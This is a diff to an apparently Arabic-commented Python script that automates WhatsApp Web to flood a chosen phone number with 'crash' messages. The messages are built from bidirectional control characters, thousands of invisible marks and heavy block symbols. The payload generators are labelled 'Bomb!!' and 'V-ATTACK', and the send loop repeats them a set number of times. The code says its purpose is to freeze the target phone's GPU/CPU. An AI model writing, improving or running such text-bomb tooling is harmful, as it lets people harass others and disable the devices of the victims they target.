@@ -22,6 +22,7 @@ class Colors:
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
 def show_banner():
+    # Logo
     clear_screen()
     banner = f"""{Colors.RED}{Colors.BOLD}
     
@@ -54,27 +55,24 @@ def main():
     print("📱 لو طلب منك، اعمل Scan للـ QR Code من موبايلك..")
     input("✅ بعد ما المحادثات تظهر، اضغط Enter هنا عشان نبدأ...")
     def generate_crash_payload():
-        # رموز بتغير اتجاه النص ورموز مخفية ورموز زخرفة تقيلة
         bidi_chars = ["\u202e", "\u202d", "\u202a", "\u202c", "\u200f"]
         heavy_chars = ["▓", "▒", "░", "█", "█","▌","▌█","▧","█", "☣️", "⚠️", "🚫"]
 
-        # توليد نص عشوائي "ملغم" بطول 2000 حرف
         payload = ""
         for _ in range(2000):
             payload += random.choice(bidi_chars) + random.choice(heavy_chars)
         
         return payload
     def generate_ultra_crash():
-        # دي بتعمل "تجميد" لمعالج الرسوميات في الموبايل (GPU)
-        # بنستخدم رموز بتخلي المحرك النصي يعيد الحسابات مالا نهاية
+        # (GPU/CPU) consumption
         bidi_loop = "\u202d\u202e" * 500 
-        invisible_mass = "‏" * 10000 # مساحة وهمية ضخمة جداً
+        invisible_mass = "‏" * 10000
         heavy_symbols = "▓▒░█" * 200
         
-        # القنبلة دي بتخلي الموبايل "يفكر" كتير قبل ما يفتح الشات
+        # Bomb!!
         return f"{bidi_loop}\n{heavy_symbols}\n{invisible_mass}\n{bidi_loop}"
     def send_scary_msg(phone_number, scary_text, count):
-            start_time = time.time() # عشان نحسب الوقت
+            start_time = time.time() # the time counter
             print(f"🚀 جاري بدء الهجوم المنظم على {phone_number}...")
             url = f"https://web.whatsapp.com/send?phone={phone_number}"
             driver.get(url) 
@@ -92,9 +90,9 @@ def main():
                 print(f"🔥 بدأ إرسال الرسالة المرعبة {count} مرة...")
 
                 for i in range(1, count + 1):
-                    # توليد الحمولة
+                    # dynamic_payload
                     dynamic_payload = my_msg + "\n" + generate_crash_payload()
-                    # التبديل بين النص وبين الـ V-Card عشان نكسر "ذكاء" الموبايل
+                    # V-ATTACK
                     if i % 2 == 0:
                         final_payload = generate_ultra_crash()
                         tag = "V-ATTACK"
